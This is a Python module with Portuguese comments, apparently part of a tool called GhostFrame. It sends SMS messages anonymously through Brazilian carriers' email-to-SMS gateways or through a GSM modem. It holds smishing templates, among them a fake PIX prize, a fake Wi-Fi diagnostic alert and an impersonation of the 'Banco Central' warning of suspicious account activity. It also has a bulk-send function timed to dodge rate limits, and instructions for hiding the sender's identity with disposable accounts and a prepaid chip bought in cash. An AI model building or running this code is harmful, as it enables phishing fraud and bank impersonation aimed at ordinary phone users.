"""
GhostFrame SMS Gateway — envio anonimo
========================================
Nenhuma credencial fica gravada em arquivo. Tudo via variaveis de ambiente.

Modo 1 (padrao) — SMS_MODE=smtp: email->SMS via SMTP
  SMTP_HOST / SMTP_PORT / SMTP_USER / SMTP_PASS / SMTP_FROM
  (NUNCA use conta pessoal: VPS anonima + Postfix proprio, ou conta descartavel)

Modo 2 — SMS_MODE=gammu: SMS real via modem USB GSM (gammu + chip pre-pago)
  Exige: apt install gammu; gammu-config apontando pro modem;
  chip ativado comprado em dinheiro, sem vinculo com voce.
"""
import os
import smtplib
import json
import time
import threading
import subprocess
from email.mime.text import MIMEText
from datetime import datetime

GATEWAY_MODE = os.environ.get("SMS_MODE", "smtp").strip().lower()

SMTP_CONFIG = {
    "host": os.environ.get("SMTP_HOST", "smtp.gmail.com"),
    "port": int(os.environ.get("SMTP_PORT", "587")),
    "user": os.environ.get("SMTP_USER", ""),
    "pass": os.environ.get("SMTP_PASS", ""),
    "from_name": os.environ.get("SMTP_FROM", "Wi-Fi Test"),
}

# Gateways email->SMS por operadora (muitos descontinuados no BR)
GATEWAYS = {
    "vivo":       "{numero}@torpedo.com.br",
    "claro":      "{numero}@clarotorpedo.com.br",
    "oi":         "{numero}@oi.com.br",
    "tim":        "{numero}@tim.com.br",
    "nextel":     "{numero}@nextel.com.br",
    "sercomtel":  "{numero}@sercomtel.com.br",
}

# Templates de SMS — não inclua links reais, use placeholder
TEMPLATES = {
    "wifi_test": (
        "Seu teste de conexao Wi-Fi esta pronto! "
        "Veja o resultado e concorra a R$1000 no PIX: {link}"
    ),
    "prize": (
        "Parabens! Voce foi sorteado no Wi-Fi Speed Test. "
        "Resgate seu premio em: {link}"
    ),
    "urgent": (
        "ALERTA: Sua conexao esta instavel. "
        "Execute o diagnostico agora: {link}"
    ),
    "whatsapp_vip": (
        "Voce foi convidado para o grupo VIP de Promocoes! "
        "Confirme sua vaga: {link}"
    ),
    "bank": (
        "Banco Central: Atividade suspeita detectada na sua conta. "
        "Verifique imediatamente: {link}"
    ),
}

# Log de envios (memoria apenas)
sms_log = []
_sms_log_lock = threading.Lock()


def send_sms(numero, template_name, link=None, operadora="vivo"):
    if GATEWAY_MODE == "gammu":
        return _send_gammu(numero, template_name, link)
    return _send_smtp(numero, template_name, link, operadora)


def _send_smtp(numero, template_name, link=None, operadora="vivo"):
    if operadora not in GATEWAYS:
        return {"ok": False, "error": f"Operadora inválida: {operadora}"}

    gateway = GATEWAYS[operadora]
    to_addr = gateway.format(numero=numero)

    template = TEMPLATES.get(template_name, TEMPLATES["wifi_test"])
    body = template.format(link=link or "http://exemplo.com")

    msg = MIMEText(body, "plain", "utf-8")
    msg["From"] = f'{SMTP_CONFIG["from_name"]} <{SMTP_CONFIG["user"]}>'
    msg["To"] = to_addr
    msg["Subject"] = ""
    msg["X-Priority"] = "1"

    try:
        server = smtplib.SMTP(SMTP_CONFIG["host"], SMTP_CONFIG["port"], timeout=15)
        server.starttls()
        server.login(SMTP_CONFIG["user"], SMTP_CONFIG["pass"])
        server.sendmail(SMTP_CONFIG["user"], [to_addr], msg.as_string())
        server.quit()

        result = {
            "ok": True,
            "mode": "smtp",
            "numero": numero,
            "operadora": operadora,
            "template": template_name,
            "to": to_addr,
            "link": link,
            "timestamp": datetime.now().isoformat(),
            "body": body[:160],
        }
        with _sms_log_lock:
            sms_log.append(result)
        return result

    except Exception as e:
        result = {
            "ok": False,
            "mode": "smtp",
            "numero": numero,
            "operadora": operadora,
            "template": template_name,
            "error": str(e),
            "timestamp": datetime.now().isoformat(),
        }
        with _sms_log_lock:
            sms_log.append(result)
        return result


def _send_gammu(numero, template_name, link=None):
    body = TEMPLATES.get(template_name, TEMPLATES["wifi_test"]).format(link=link or "http://exemplo.com")
    try:
        p = subprocess.run(
            ["gammu", "sendsms", "TEXT", str(numero), "-text", body[:160]],
            capture_output=True, text=True, timeout=60,
        )
        out = (p.stdout or "") + (p.stderr or "")
        ok = p.returncode == 0 and "failed" not in out.lower() and "error" not in out.lower()
        result = {
            "ok": ok,
            "mode": "gammu",
            "numero": numero,
            "template": template_name,
            "body": body[:160],
            "stdout": out.strip()[-300:],
            "timestamp": datetime.now().isoformat(),
        }
        with _sms_log_lock:
            sms_log.append(result)
        return result
    except Exception as e:
        result = {
            "ok": False,
            "mode": "gammu",
            "numero": numero,
            "error": str(e)[:200],
            "timestamp": datetime.now().isoformat(),
        }
        with _sms_log_lock:
            sms_log.append(result)
        return result


def send_blast(numeros, template_name, link=None, operadora="vivo", delay=3):
    """Envia em massa com delay (anti-rate-limit). Roda em thread separada."""
    results = []
    for numero in numeros:
        r = send_sms(numero, template_name, link, operadora)
        results.append(r)
        time.sleep(delay)
    return results


def get_sms_log(limit=50):
    with _sms_log_lock:
        return list(sms_log[-limit:])


def get_operadoras():
    return list(GATEWAYS.keys())


def get_templates():
    return list(TEMPLATES.keys())


def configure_smtp(host, port, user, password, from_name="Wi-Fi Test"):
    SMTP_CONFIG.update({
        "host": host,
        "port": int(port),
        "user": user,
        "pass": password,
        "from_name": from_name,
    })
    return {"ok": True, "host": host, "user": user}


def test_smtp():
    if GATEWAY_MODE == "gammu":
        try:
            p = subprocess.run(["gammu", "identify"], capture_output=True, text=True, timeout=30)
            return {"ok": p.returncode == 0, "mode": "gammu", "stdout": (p.stdout + p.stderr).strip()[-300:]}
        except Exception as e:
            return {"ok": False, "mode": "gammu", "error": str(e)[:200]}
    try:
        server = smtplib.SMTP(SMTP_CONFIG["host"], SMTP_CONFIG["port"], timeout=10)
        server.starttls()
        server.login(SMTP_CONFIG["user"], SMTP_CONFIG["pass"])
        server.quit()
        return {"ok": True, "mode": "smtp"}
    except Exception as e:
        return {"ok": False, "mode": "smtp", "error": str(e)}
